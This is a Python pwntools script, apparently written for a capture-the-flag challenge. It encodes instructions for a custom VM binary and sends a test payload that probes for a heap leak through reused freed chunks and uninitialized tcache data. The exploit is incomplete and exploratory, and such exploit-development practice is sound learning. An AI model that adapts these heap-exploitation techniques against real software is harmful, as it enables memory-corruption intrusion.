#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# VM instruction encoders
def hlt():
    """Opcode 0, mode 0: halt execution"""
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    """Opcode 1, mode 2: reg = imm32"""
    return bytes([0x41, reg]) + p32(imm32)

def store_mem_reg(reg, offset):
    """Opcode 1, mode 1: mem[IP+offset] = reg (3-byte instruction)"""
    return bytes([0x21, reg, offset])

def load_reg_mem(reg, offset):
    """Opcode 1, mode 3: reg = mem[IP+offset] (3-byte instruction)"""
    return bytes([0x61, reg, offset])

def push_reg(reg):
    """Opcode 2, mode 0: push reg to stack (uses r15 as SP)"""
    return bytes([0x02, reg])

def pop_reg(reg):
    """Opcode 3, mode 0: pop from stack to reg (uses r15 as SP)"""
    return bytes([0x03, reg])

def add_reg_imm(reg, imm32):
    """Opcode 4, mode 2: reg += imm32"""
    return bytes([0x44, reg]) + p32(imm32)

def sub_reg_imm(reg, imm32):
    """Opcode 5, mode 2: reg -= imm32"""
    return bytes([0x45, reg]) + p32(imm32)

def and_reg_imm(reg, imm32):
    """Opcode 8, mode 2: reg &= imm32"""
    return bytes([0x48, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    """Opcode 9, mode 2: reg >>= imm32"""
    return bytes([0x49, reg]) + p32(imm32)

def cmp_reg_imm(reg, imm32):
    """Opcode 13, mode 2: compare reg with imm32"""
    return bytes([0x4d, reg]) + p32(imm32)

def jmp_reg(reg):
    """Opcode 14, mode 0: jump to reg"""
    return bytes([0x0e, reg])

def jne_reg(reg):
    """Opcode 16, mode 0: jump to reg if not equal"""
    return bytes([0x10, reg])

def je_reg(reg):
    """Opcode 15, mode 0: jump to reg if equal"""
    return bytes([0x0f, reg])

def trigger_illegal():
    """Trigger illegal instruction for testing"""
    return bytes([0xFF])

# Test: Can we leak heap data?
def test_heap_leak():
    print("[*] Testing heap leak...")
    
    code = b''
    
    # Allocate first page at 0x00000000 (will be our code page)
    # Actually, our code is loaded there by init
    
    # Allocate pages at different addresses to create pattern
    # Address 0x01000000 - triggers new L2 and L3, then page
    # We want to:
    # 1. Allocate page A at 0x01000000
    # 2. Allocate page B at 0x01000100 (adjacent to A)
    # 3. Zero out B's data -> cleanup will free it
    # 4. Allocate page B again -> reuses freed chunk
    # 5. Read uninitialized data from B (contains tcache metadata)
    
    # First, let's just allocate pages and see if we get anything interesting
    
    # Set r15 (SP) to 0x01000000 (this will allocate a page there)
    code += mov_reg_imm(15, 0x010000FF)  # SP = 0x010000FF
    
    # Push r0 (value 0) to page at 0x01000000, offset 0xFF
    # This writes 4 bytes at page[0xFF+4] = page[0x103]
    code += mov_reg_imm(0, 0)
    code += push_reg(0)  # This allocates page at 0x01000000 and writes
    
    # SP is now 0x010000FB
    # Let's read from the page we just wrote to
    code += mov_reg_imm(15, 0x01000004)  # Point SP to start of page data
    code += pop_reg(1)  # Read 4 bytes from page[0x04+4] = page[8]
    
    # Now let's try to trigger a leak
    # We'll write the read value somewhere we can examine
    # Actually, let's just halt and see what happens
    
    code += hlt()
    
    # Pad to ensure we have enough code
    while len(code) < 32:
        code += b'\x00'
    
    return code

def main():
    # Use provided libc
    elf = ELF('./mqda')
    libc = ELF('./libc.so.6')
    
    # Run locally with patchelf to use the provided libc
    # p = process(['./mqda'], env={'LD_PRELOAD': './libc.so.6'})
    p = process(['./mqda'])
    
    code = test_heap_leak()
    
    print(f"[*] Code length: {len(code)}")
    
    # Send code address
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')  # Load code at address 0
    
    # Send code length
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    
    # Send code
    p.recvuntil(b'Code> ')
    p.send(code)
    
    # Send entry IP
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    # Get output
    output = p.recvall(timeout=2)
    print(f"[*] Output: {output}")
    
    p.close()

if __name__ == '__main__':
    main()
